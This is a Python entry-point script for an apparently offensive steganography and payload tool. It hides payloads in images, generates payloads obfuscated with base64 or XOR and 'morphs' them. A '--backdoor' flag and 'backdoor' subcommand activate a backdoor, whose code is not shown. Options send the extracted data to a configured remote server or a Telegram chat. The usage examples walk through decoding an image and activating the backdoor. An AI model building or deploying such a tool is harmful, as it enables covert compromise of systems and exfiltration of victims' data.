import argparse
import logging
import sys
import json
from modules.steganography import encode_image, decode_image, detect_stego
from modules.payload import generate_payload, deobfuscate_payload, morph_payload
from modules.network import send_to_server, send_to_telegram
from modules.backdoor import backdoor

def load_config(config_path='config.json'):
    """Load configuration from a JSON file."""
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        logging.warning(f"Configuration file not found at {config_path}. Using default or command-line values.")
        return {}
    except json.JSONDecodeError:
        logging.error(f"Invalid JSON in configuration file: {config_path}")
        return {}

def main():
    config = load_config()

    parser = argparse.ArgumentParser(
        description="Ultimate Steganography and Payload Tool",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
    # Encode a morphed message into an image
    python main.py encode --input-image input.png --payload "Secret" --output-image output.png --morph

    # Decode a message from an image and activate the backdoor
    python main.py decode --input-image output.png --backdoor

    # Generate a morphed payload
    python main.py gen-payload --morph --output-file morphed_payload.bin
"""
    )
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Encode command
    encode_parser = subparsers.add_parser("encode", help="Embed payload into an image")
    encode_parser.add_argument("--input-image", required=True, help="Input image path")
    encode_parser.add_argument("--payload", required=True, help="Text or file path for the payload")
    encode_parser.add_argument("--output-image", required=True, help="Output image path")
    encode_parser.add_argument("--file", action="store_true", help="Indicates that the payload is a file path")
    encode_parser.add_argument("--encrypt", action="store_true", help="Encrypt the payload")
    encode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"], help="Encryption method to use")
    encode_parser.add_argument("--key", help="Base64 encoded key for encryption")
    encode_parser.add_argument("--compress", action="store_true", help="Compress the payload")
    encode_parser.add_argument("--adaptive", action="store_true", help="Use adaptive embedding in edge regions")
    encode_parser.add_argument("--seed", help="Seed for random pixel ordering")
    encode_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel to use")
    encode_parser.add_argument("--opap", action="store_true", help="Use Optimal Pixel Adjustment Process (OPAP)")
    encode_parser.add_argument("--morph", action="store_true", help="Morph the payload before encoding")

    # Decode command
    decode_parser = subparsers.add_parser("decode", help="Extract payload from an image")
    decode_parser.add_argument("--input-image", required=True, help="Input image path")
    decode_parser.add_argument("--key", help="Base64 encoded key for decryption")
    decode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"], help="Decryption method to use")
    decode_parser.add_argument("--compress", action="store_true", help="Decompress the payload")
    decode_parser.add_argument("--output-file", help="Path to save the extracted payload")
    decode_parser.add_argument("--adaptive", action="store_true", help="Use adaptive extraction from edge regions")
    decode_parser.add_argument("--seed", help="Seed for random pixel ordering")
    decode_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel used")
    decode_parser.add_argument("--backdoor", action="store_true", help="Activate the backdoor after decoding")
    decode_parser.add_argument("--send-server", action="store_true", help="Send extracted data to a remote server")
    decode_parser.add_argument("--send-telegram", action="store_true", help="Send extracted data to a Telegram chat")

    # Payload generation command
    gen_payload_parser = subparsers.add_parser("gen-payload", help="Generate a payload")
    gen_payload_parser.add_argument("--type", default='random', choices=['random', 'custom'], help="Type of payload")
    gen_payload_parser.add_argument("--length", type=int, default=100, help="Length of the random payload")
    gen_payload_parser.add_argument("--data", help="Custom data for the payload")
    gen_payload_parser.add_argument("--obfuscate", action="store_true", help="Obfuscate the payload")
    gen_payload_parser.add_argument("--obfuscate-method", default='base64', choices=['base64', 'xor'], help="Obfuscation method")
    gen_payload_parser.add_argument("--morph", action="store_true", help="Morph the payload")
    gen_payload_parser.add_argument("--output-file", help="File to save the generated payload")

    # Detect command
    detect_parser = subparsers.add_parser("detect", help="Detect the presence of a hidden message in an image")
    detect_parser.add_argument("--input-image", required=True, help="Input image path")
    detect_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel to check")

    # Backdoor command
    backdoor_parser = subparsers.add_parser("backdoor", help="Activate the backdoor")


    args = parser.parse_args()

    # Setup logging
    level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

    seed = int(args.seed) if hasattr(args, 'seed') and args.seed else None

    try:
        if args.command == "encode":
            payload_to_embed = args.payload
            if args.morph:
                morphed_payload, morph_key = morph_payload(args.payload.encode())
                payload_to_embed = morphed_payload
                logging.info(f"Payload morphed with key: {morph_key}")

            encode_image(
                input_path=args.input_image,
                payload=payload_to_embed,
                output_path=args.output_image,
                bits_per_channel=args.bits,
                encrypt=args.encrypt,
                encrypt_method=args.encrypt_method,
                key=args.key,
                compress=args.compress,
                adaptive=args.adaptive,
                seed=seed,
                is_file=args.file,
                verbose=args.verbose,
                opap=args.opap
            )
            print("Encoding complete.")

        elif args.command == "decode":
            extracted_data = decode_image(
                input_path=args.input_image,
                key=args.key,
                encrypt_method=args.encrypt_method,
                compress=args.compress,
                output_file=args.output_file,
                bits_per_channel=args.bits,
                adaptive=args.adaptive,
                seed=seed,
                verbose=args.verbose
            )
            if extracted_data is not None:
                print("Extracted Payload:", extracted_data)
                if args.send_server:
                    server_url = config.get("server", {}).get("url")
                    if server_url:
                        send_to_server(server_url, extracted_data)
                    else:
                        logging.error("Server URL not configured.")
                if args.send_telegram:
                    tg_config = config.get("telegram", {})
                    token = tg_config.get("bot_token")
                    chat_id = tg_config.get("chat_id")
                    if token and chat_id:
                        send_to_telegram(token, chat_id, extracted_data)
                    else:
                        logging.error("Telegram bot token or chat ID not configured.")
                if args.backdoor:
                    print("Activating backdoor...")
                    backdoor()

        elif args.command == "gen-payload":
            payload = generate_payload(
                payload_type=args.type,
                length=args.length,
                data=args.data,
                obfuscate=args.obfuscate,
                obfuscate_method=args.obfuscate_method,
                morph=args.morph
            )
            if args.output_file:
                with open(args.output_file, 'wb') as f:
                    f.write(payload)
                print(f"Payload saved to {args.output_file}")
            else:
                print("Generated Payload:", payload.decode(errors='ignore'))

        elif args.command == "detect":
            result = detect_stego(input_path=args.input_image, bits_per_channel=args.bits)
            print(result)

        elif args.command == "backdoor":
            print("Activating backdoor...")
            backdoor()

    except Exception as e:
        logging.error(f"An error occurred: {e}", exc_info=args.verbose)
        sys.exit(1)

if __name__ == "__main__":
    main()